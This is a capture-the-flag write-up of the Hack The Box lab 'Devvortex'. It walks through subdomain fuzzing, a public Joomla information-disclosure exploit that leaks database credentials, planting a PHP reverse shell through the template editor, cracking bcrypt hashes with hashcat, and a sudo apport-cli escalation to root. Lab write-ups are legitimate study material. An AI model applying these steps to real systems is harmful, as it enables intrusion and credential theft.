# DEVVORTEX

as usual check ip on firefox gave us our domain name: devvortex.htb

Nothing seems interesting on the website 

Well after quite some time of research 
```
wfuzz -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-20000.txt -u http://devvortex.htb/ -H 'Host: FUZZ.devvortex.htb' -t 50 --hc 302
```

We can find that there is a dev.devvortex.htb domain so we add that to our /etc/hosts

error page 
```
The requested page can't be found.

An error has occurred while processing your request.
```

probably joomla CMS

found : http://dev.devvortex.htb/robots.txt
```
User-agent: *
Disallow: /administrator/
Disallow: /api/
Disallow: /bin/
Disallow: /cache/
Disallow: /cli/
Disallow: /components/
Disallow: /includes/
Disallow: /installation/
Disallow: /language/
Disallow: /layouts/
Disallow: /libraries/
Disallow: /logs/
Disallow: /modules/
Disallow: /plugins/
Disallow: /tmp/
```

It was indeed joomla 
http://dev.devvortex.htb//administrator/

little bit of google search Joomla! v4.2.8 - Unauthenticated information disclosure 
```
https://www.exploit-db.com/exploits/51334
```

running the exploit 
```
└─$ sudo ruby joomla_expl.rb http://dev.devvortex.htb
Users
[649] lewis (lewis) - lewis@devvortex.htb - Super Users
[650] logan paul (logan) - logan@devvortex.htb - Registered

Site info
Site name: Development
Editor: tinymce
Captcha: 0
Access: 1
Debug status: false

Database info
DB type: mysqli
DB host: localhost
DB user: lewis
DB password: P4ntherg0t1n5r3c0n##
DB name: joomla
DB prefix: sd4fg_
DB encryption 0
```

We can sign up as MR lewis 

Once we are logged in we can add content to the website we will make a new php page which will be a reverseshell 
System -> site template -> cassiopeia -> create a new file -> reverse.php 

user.txt is in /home/logan 

we try to acces database as lewis 
```
www-data@devvortex:/$ mysql -u lewis -p
mysql -u lewis -p
Enter password: P4ntherg0t1n5r3c0n##
```
```
mysql> select * from sd4fg_users;
select * from sd4fg_users;
+-----+------------+----------+---------------------+--------------------------------------------------------------+-------+-----------+---------------------+---------------------+------------+---------------------------------------------------------------------------------------------------------------------------------------------------------+---------------+------------+--------+------+--------------+--------------+
| id  | name       | username | email               | password                                                     | block | sendEmail | registerDate        | lastvisitDate       | activation | params                                                                                                                                                  | lastResetTime | resetCount | otpKey | otep | requireReset | authProvider |
+-----+------------+----------+---------------------+--------------------------------------------------------------+-------+-----------+---------------------+---------------------+------------+---------------------------------------------------------------------------------------------------------------------------------------------------------+---------------+------------+--------+------+--------------+--------------+
| 649 | lewis      | lewis    | lewis@devvortex.htb | $2y$10$6V52x.SD8Xc7hNlVwUTrI.ax4BIAYuhVBMVvnYWRceBmy8XdEzm1u |     0 |         1 | 2023-09-25 16:44:24 | 2023-12-09 11:48:17 | 0          |                                                                                                                                                         | NULL          |          0 |        |      |            0 |              |
| 650 | logan paul | logan    | logan@devvortex.htb | $2y$10$IT4k5kmSGvHSO9d6M/1w0eYiB5Ne9XzArQRFJTGThNiy/yBtkIj12 |     0 |         0 | 2023-09-26 19:15:42 | NULL                |            | {"admin_style":"","admin_language":"","language":"","editor":"","timezone":"","a11y_mono":"0","a11y_contrast":"0","a11y_highlight":"0","a11y_font":"0"} | NULL          |          0 |        |      |            0 |              |
+-----+------------+----------+---------------------+--------------------------------------------------------------+-------+-----------+---------------------+---------------------+------------+---------------------------------------------------------------------------------------------------------------------------------------------------------+---------------+------------+--------+------+--------------+--------------+
2 rows in set (0.00 sec)
```

from here we try to hashcat the hash wich seems to be a 3200 (bcrypt $2*$, Blowfish (Unix))

so 
```
hashcat  -m 3200 -a 0 ./logan.hashed /usr/share/wordlists/rockyou.txt
```

$2y$10$IT4k5kmSGvHSO9d6M/1w0eYiB5Ne9XzArQRFJTGThNiy/yBtkIj12:tequieromucho

we can now ssh as logan@devvortex.htb with password tequieromucho

we have user.txt here
```
logan@devvortex:/tmp$ sudo -l
[sudo] password for logan: 
Matching Defaults entries for logan on devvortex:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User logan may run the following commands on devvortex:
    (ALL : ALL) /usr/bin/apport-cli
```

in order to make the apport-cli cve to work we need a crash report so 
```
logan@devvortex:~$ sleep 60 &
[1] 1228
logan@devvortex:~$ kill -SIGSEGV 1228
logan@devvortex:~$ ls /var/crash/
_usr_bin_sleep.1000.crash
```

then all we need is to 
```
sudo /usr/bin/apport-cli /var/crash/_usr_bin_sleep.1000.crash
```

Press v to see the report and we are root  

Rooted 
